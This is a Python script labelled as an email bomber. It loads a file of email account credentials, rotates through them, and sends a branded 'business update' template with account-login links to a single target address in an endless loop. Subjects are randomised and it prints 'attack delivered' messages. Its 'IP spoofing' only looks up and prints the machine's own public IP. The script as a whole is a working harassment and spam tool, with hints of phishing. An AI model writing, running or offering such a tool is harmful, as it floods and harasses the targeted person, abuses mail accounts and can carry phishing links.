import smtplib
import os
import random
import requests  # Used to fetch public IP and location data
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.utils import formataddr
import time

# Email Bombing Parameters
smtp_server = "smtp.titan.email"  # SMTP server for your custom domain
smtp_port = 587                      # SMTP port (587 for TLS, 465 for SSL)

# File paths for the template and credentials
template_file = "templates/template1.html"  # Path to the HTML template
credentials_file = "credentials.txt"        # File containing email credentials

# ANSI escape code for red text
RED = "\033[91m"
RESET = "\033[0m"

# Print a message with a timestamp and red color, then sleep for 60 seconds
def print_hacker_message(message):
    current_time = time.strftime("%H:%M:%S", time.localtime())
    print(f"{RED}[{current_time}] {message}{RESET}")
    time.sleep(60)  # Simulate a delay of 1 minute between actions

# Function to fetch the external public IP address and country
def get_public_ip_info():
    try:
        # Fetch the IP and location information using an external service
        response = requests.get('http://ipinfo.io')
        data = response.json()

        ip_address = data['ip']        # Extract the public IP
        country = data['country']      # Extract the country of the IP

        return ip_address, country
    except Exception as e:
        return "Unknown IP", "Unknown Country"

# Load email credentials from file
def load_credentials(file_path):
    credentials = []
    with open(file_path, 'r') as file:
        for line in file.readlines():
            # Split only at the first colon, to handle passwords with colons
            parts = line.strip().split(':', 1)
            if len(parts) == 2:  # Ensure that the line has exactly two parts
                credentials.append(parts)
            else:
                print(f"Skipping invalid line in file: {line}")
    return credentials

# Load the HTML template
def load_template(template_path):
    with open(template_path, 'r') as file:
        return file.read()

# Function to send email
def send_email(sender_email, sender_password, recipient_email, subject, html_body):
    try:
        # Create email message
        msg = MIMEMultipart('alternative')
        
        # Show company name instead of email address in the From field
        msg['From'] = formataddr(('Acquired Online', sender_email))
        msg['To'] = recipient_email
        msg['Subject'] = subject
        
        # Custom headers for email authentication (to improve deliverability)
        msg.add_header('X-Mailer', 'Python SMTP Script')
        msg.add_header('List-Unsubscribe', '<mailto:unsubscribe@outlook.com>')

        # Add the HTML template as the email body
        msg.attach(MIMEText(html_body, 'html'))

        # Optionally, add a plain-text version for better deliverability
        plain_text = """
        Dear Valued Customer,

        We are excited to inform you about the latest developments at Acquired Online that will further enhance the services we provide to you.

        Over the past few months, we have been working tirelessly to expand our offerings and improve our infrastructure to serve you better.

        Key Updates:
        1. Enhanced Service Reliability
        2. New Customer Portal
        3. 24/7 Support

        You can now reach us at support@acquired.online.

        Visit Your Account: https://acquired.online/login

        Best regards,
        The Acquired Online Team

        If you wish to unsubscribe, click here: https://acquired.online/unsubscribe.
        """
        msg.attach(MIMEText(plain_text, 'plain'))

        # Establish connection with the SMTP server
        server = smtplib.SMTP(smtp_server, smtp_port)
        server.starttls()  # Secure the connection
        server.login(sender_email, sender_password)

        # Send the email (Do NOT print the sender email for the clean look)
        server.sendmail(sender_email, recipient_email, msg.as_string())
        server.quit()

        return True  # Email sent successfully

    except smtplib.SMTPAuthenticationError:
        return False  # Authentication failure

    except Exception as e:
        return False  # General failure

# Main function to rotate accounts and send emails using only template1.html
def start_email_campaign(target_email):
    # Ask user if they want to spoof IP
    spoof_ip = input(f"{RED}Do you want to spoof the IP address? (yes/no): {RESET}")
    
    if spoof_ip.lower() == "yes":
        # Get the external public IP address and country information
        ip_address, country = get_public_ip_info()

        # Simulate spoofing the IP by printing it
        print_hacker_message(f"IP address spoofed: {ip_address} - {country}")
    else:
        print_hacker_message("Skipping IP spoofing...")

    # Print hacker-like startup messages with 60-second delays between them
    print_hacker_message("Starting email bomber...")
    print_hacker_message("Customizing headers...")
    print_hacker_message("Spoofing IP address...")
    print_hacker_message("Adding malicious links...")

    credentials = load_credentials(credentials_file)
    html_template = load_template(template_file)

    if not html_template:
        print_hacker_message("No email template found. Exiting...")
        return

    if not credentials:
        print_hacker_message("No valid credentials found. Exiting...")
        return

    num_accounts = len(credentials)
    
    # Email counter to track how many emails have been sent
    email_count = 0

    # Loop to send emails, one per minute from each account
    while True:
        # Define the subject for the email
        subject = f"Important Business Update #{random.randint(1000, 9999)}"  # Randomized subject

        # Get the sender account in a round-robin fashion
        sender_index = email_count % num_accounts
        sender_email, sender_password = credentials[sender_index]

        # Try sending the email using the current account
        success = send_email(sender_email, sender_password, target_email, subject, html_template)

        if success:
            # Print success message without showing sender email (for clean output)
            print_hacker_message(f"Attack delivered successfully.")
        else:
            # Skip failed account, and continue to the next one
            print_hacker_message("Failed to deliver Attack. Skipping...")

        email_count += 1  # Increment email count

        # Wait for 60 seconds before sending the next email
        print_hacker_message("Waiting for 60 seconds before sending the next attack...")

# Run the email campaign
if __name__ == "__main__":
    target_email = input(f"{RED}Enter the target email address: {RESET}")
    start_email_campaign(target_email)

